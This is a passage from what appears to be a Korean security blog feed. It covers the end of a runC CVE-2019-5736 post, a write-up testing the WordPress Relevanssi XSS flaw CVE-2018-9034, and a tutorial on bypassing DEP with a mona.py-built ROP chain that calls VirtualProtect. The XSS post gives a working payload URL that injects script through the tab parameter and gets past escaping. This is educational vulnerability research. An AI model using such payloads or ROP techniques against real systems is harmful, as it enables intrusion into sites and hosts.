  &lt;li&gt;&lt;strong&gt;컨테이너 시작 시 호출되는 바이너리의 임시 백업 바이너리 생성&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;…….&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;해당 취약점에 영향을 받는 여러 업체들(Red Hat, runC 관리자, google, Amazon, Docker, debian, ubuntn 등등)은 취약 runC 버전에 대해서 업데이트 한 이미지를 배포중입니다.&lt;/p&gt;

&lt;p&gt;영어 해석에 재능이 부족하여 틀린 내용이 있다면 알려주시기 바랍니다 :)&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;

&lt;h2 id=&quot;references-참고-문헌&quot;&gt;References 참고 문헌&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html&lt;/li&gt;
  &lt;li&gt;https://brauner.github.io/2019/02/12/privileged-containers.html&lt;/li&gt;
  &lt;li&gt;https://www.helpnetsecurity.com/2019/02/12/runc-container-escape-flaw/&lt;/li&gt;
  &lt;li&gt;https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/&lt;/li&gt;
  &lt;li&gt;https://vulmon.com/exploitdetails?qidtp=EDB&amp;amp;qid=46369&lt;/li&gt;
  &lt;li&gt;https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d&lt;/li&gt;
  &lt;li&gt;https://github.com/rancher/runc-cve&lt;/li&gt;
  &lt;li&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/li&gt;
  &lt;li&gt;https://subicura.com/2017/01/19/docker-guide-for-beginners-1.html&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">CVE-2019-5736 (runC Container 취약점)</summary></entry><entry><title type="html">web-0x03</title><link href="/web-0x03" rel="alternate" type="text/html" title="web-0x03" /><published>2019-03-25T14:00:00+09:00</published><updated>2019-03-25T14:00:00+09:00</updated><id>/web-0x03</id><content type="html" xml:base="/web-0x03">&lt;h1 id=&quot;cve-2018-9034-1day-test&quot;&gt;CVE-2018-9034 1Day Test&lt;/h1&gt;

&lt;p&gt;안녕하세요 hackyu입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Wordpress 환경에서의 검색 기능을 제공하는 Relevanssi Search Plugin 4.0.4 이전버전(Version 4.0.4 포함)에서 발생한 CVE-2018-9034 XSS(Cross Site Scripting - Reflected) 취약점에 대한 포스팅입니다.&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;취약점-분석&quot;&gt;취약점 분석&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;환경구성&lt;/strong&gt;&lt;br /&gt;
    &lt;ul&gt;
      &lt;li&gt;Apache 2.4.18&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;PHP 7.0.30&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Wordpress 4.9.4&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Wordpress Relevanssi Search Plugin 4.0.4&lt;br /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_1.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - CVE-2018-9034 Flow -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;다음은 취약점이 발생한 Relevanssi Search Plugin lib/interface.php를 확인해보면, tab 파라미터에 스크립트를 삽입하여 요청하는 경우 취약점이 발생이 가능한 것을 확인할 수 있습니다.&lt;br /&gt;&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_2.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - relevanssi.php -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_3.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - interface.php -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;취약점-공격-테스트&quot;&gt;취약점 공격 테스트&lt;/h5&gt;
&lt;p&gt;제일 기본적으로 스크립트가 정상적으로 구동이 되는지
&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert('TEST');&amp;lt;/script&amp;gt;&lt;/code&gt;를 tab 파라미터로 요청한 결과로 스크립트가 구동되지 않고, 기본적으로 스크립트에 사용될 수 있는 ‘, “ 등 Escape 문자인 경우 ‘'가 붙어 응답되어 스크립트가 정상적으로 구동되지 않았고, 스크립트 삽입 시 Escape문자를 사용할 수 없는 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_4.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - XSS 구문 삽입 테스트 Escape문자로 인해 실행되지 않음 -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Escape 문자를 사용할 수 없는 경우 다음과 그림과 같이 Javascript의 substring(), String()를 이용하여 ‘/’(인덱스 start, end)를 제외한 문자열을 다시 변수 x에 대입하여 원하는 문자열을 이용하여 스크립트를 사용할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_5.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - Javascript 테스트 -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;공격 시 사용되는 tab 파라미터를 통한 Payload는 다음과 같습니다.&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nx&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wordpress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;general&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relevanssi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relevanssi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;gt;&amp;lt;script&amp;gt;var x = String(/hackyu CVE-2018-9034 TEST/);x = x.substring(1, x.length-1);alert(x)&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;위의 Payload를 이용하여 다음과 같이 정상적으로 스크립트가 실행되는 것을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_6.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - XSS 시도 및 결과  -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;패치 및 대응방안&lt;/strong&gt;
&lt;br /&gt;
-Update to version
&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_7.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - Relevanssi Version 4.0.4(좌), 4.0.5(우) -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;References&lt;/strong&gt;
&lt;br /&gt;
https://www.exploit-db.com/exploits/44366&lt;br /&gt;
https://ppbuz.com/8644&lt;br /&gt;
https://nvd.nist.gov/vuln/detail/CVE-2018-9034&lt;br /&gt;
https://pluginarchive.com/wordpress/relevanssi/v/4-0-4&lt;br /&gt;
https://downloads.wordpress.org/plugin/relevanssi.4.0.4.zip&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Hackyu</name></author><category term="Posts" /><summary type="html">CVE-2018-9034 1Day Test</summary></entry><entry><title type="html">windows-0x09</title><link href="/windows-0x09" rel="alternate" type="text/html" title="windows-0x09" /><published>2019-03-24T20:18:00+09:00</published><updated>2019-03-24T20:18:00+09:00</updated><id>/windows-0x09</id><content type="html" xml:base="/windows-0x09">&lt;h1 id=&quot;0x09-dep3&quot;&gt;0x09 DEP(3)&lt;/h1&gt;

&lt;p&gt;이번 시간에는 DEP의 마지막 주제인 ROP에 대해서 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;rop-return-oriented-programming&quot;&gt;ROP (Return Oriented Programming)&lt;/h5&gt;

&lt;p&gt;ROP는 Gadget으로 Chain을 구성하여 API를 호출하는 방식의 공격 기법입니다.&lt;/p&gt;

&lt;p&gt;주로 VirtualProtect()나 SetProcessDEPPolicy() 등 메모리와 관련된 함수들을 호출하며,&lt;/p&gt;

&lt;p&gt;Shellcode를 실행할 수 있도록 실행 권한을 추가하는 방향으로 진행됩니다.&lt;/p&gt;

&lt;p&gt;이번 연재에서는 가장 흔하고 쉬운 방식인 VirtualProtect() API를 호출해서 DEP를 우회하도록 하겠습니다.&lt;/p&gt;

&lt;h6 id=&quot;virtualprotect-함수&quot;&gt;VirtualProtect 함수&lt;/h6&gt;

&lt;p&gt;VirtualProtect는 4개의 인자를 가지며, 특정 메모리 영역의 실행 권한을 변경해주는 함수입니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BOOL WINAPI VirtualProtect (
		_In_ LPVOID lpAddress, 		 # 권한을 변경할 메모리 영역의 시작 주소
		_In_ SIZE_T dwSize,	   		 # 변경할 크기
		_In_ flNewProtect,     		 # 변경할 속성 값
		_Out_ PDWORD lpflOldProtect, # 이전 값 저장 (쓰기 가능한 영역)
	);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;VirtualProtect 함수는 변경을 원하는 메모리 영역의 시작 주소를 기준으로 원하는 크기만큼 실행 권한을 변경해줍니다.&lt;/p&gt;

&lt;p&gt;그럼 ShellCode를 넣어둔 뒤, 그 크기만큼 실행 권한을 주면 되겠네요.&lt;/p&gt;

&lt;p&gt;이 내용을 STACK으로 구성하면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그림처럼 STACK을 구성할 경우, VirtualProtect()가 호출되어 ShellCode가 들어있는 메모리 주소에 실행 권한이 생길 것이고,&lt;/p&gt;

&lt;p&gt;다음 RET에서 JMP ESP가 호출되어 ShellCode가 실행될 것 입니다.&lt;/p&gt;

&lt;p&gt;그리고 이 모양의 STACK을 구성하기 위해 PUSHAD 명령어를 이용할 것 입니다. STACK 구성이 좀 더 쉽겠죠?&lt;/p&gt;

&lt;h5 id=&quot;payload-구성&quot;&gt;PAYLOAD 구성&lt;/h5&gt;

&lt;p&gt;Mona.py를 이용해서 ROP Chain 구성에 사용할 Gadget들을 찾아 보겠습니다. ( !mona modules )&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Gadget은 위의 Module들 중에 ASLR이 적용되어 있지 않은 example.dll에서 가져다 쓰면 되겠네요.&lt;/p&gt;

&lt;p&gt;이제 여기서 Gadget을 구해서 값들을 맞춰주기만 하면 되는데,,, 일일이 하나씩 찾아서 넣으면 엄청나게 많은 시간이 소요되겠죠??&lt;/p&gt;

&lt;p&gt;하나하나 다 찾아다닐 시간은 없으니까 mona.py에서 제공하는 기능을 활용하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona rop -m example
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 명령어를 사용하면 mona.py에서 자동으로 rop 공격에 필요한 Gadget들을 example.dll에서 찾아 파일로 생성해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;여러 언어에 맞게 추천을 해주는데 여러분 환경에 맞는 값을 사용하시면 됩니다.&lt;/p&gt;

&lt;p&gt;이제 필요한 Gadget들을 아주 손쉽게 찾아왔는데 한 가지 생각해야 할 점이 있습니다.&lt;/p&gt;

&lt;p&gt;바로 VirtualProtect의 함수 주소입니다.&lt;/p&gt;

&lt;p&gt;ASLR이 적용되어 있으면 Window API 함수들의 주소도 계속해서 변할텐데 어떻게 주소를 가지고 올 수 있는 걸까요?&lt;/p&gt;

&lt;p&gt;Gadget 파일을 잘 보시면 VirtualProtect에 IAT라고 적혀있는 것을 보실 수 있을 겁니다.&lt;/p&gt;

&lt;p&gt;IAT(Import Address Table)는 프로그램에서 사용되는 라이브러리에서 어떤 함수들을 사용하고 있는지, 그 함수들의 정보를 기술한 테이블입니다.&lt;/p&gt;

&lt;p&gt;아래와 같이 example.dll의 IAT를 살펴보면 우리가 사용하고자 하는 VirtualProtect() 함수의 정보가 들어있는 것을 확인하실 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이렇게 VirtualProtect() 정보가 들어 있는 경우에는 IAT 값에서 시작 주소를 가져다가 쓰면 되는 것이죠.&lt;/p&gt;

&lt;p&gt;없다면? 동적으로 찾아오도록 Gadget을 구성하면 됩니다.&lt;/p&gt;

&lt;h5 id=&quot;null-byte-제거&quot;&gt;Null Byte 제거&lt;/h5&gt;

&lt;p&gt;공격을 성공적으로 하기 위해 Payload에 존재하는 Null Byte들을 제거해줘야겠죠?&lt;/p&gt;

&lt;p&gt;mona가 만들어 준 값들엔 Null Byte가 존재해서 Payload 전달이 완전하게 이루어지지 않는답니다.&lt;/p&gt;

&lt;p&gt;그래서 다음과 같이 수정을 했습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저, 0x201, 0x40 같은 값을 넣어줘야 하는데 Null이 존재하므로 0xfffffdff, 0xffffffc0를 넣고 neg를 사용해서 값을 생성해줬습니다.&lt;/p&gt;

&lt;p&gt;그리고 Gadget 주소 중에 Null이 존재하는 것은 다른 Gadget 찾아서 교체해준 내용입니다.&lt;/p&gt;

&lt;p&gt;mona만 믿고 Payload를 구성하시면 안됩니다. 잘 살펴보고 Null은 반드시 제거해주셔야 합니다.&lt;/p&gt;

&lt;p&gt;이어서 DBG로 살펴보면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;strcpy가 실행되고 나서의 모습입니다. 각 Gadget들이 연속해서 실행된 뒤, VirtualProtect() 함수가 실행될 것이고,&lt;/p&gt;

&lt;p&gt;마지막에 JMP ESP가 실행되면서 ShellCode가 실행되겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;잘 실행되네요^^&lt;/p&gt;

&lt;p&gt;지금까지 DEP에 대해서 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 연재부터는 Heap Exploit으로 찾아뵙도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x09 DEP(3)</summary></entry></feed>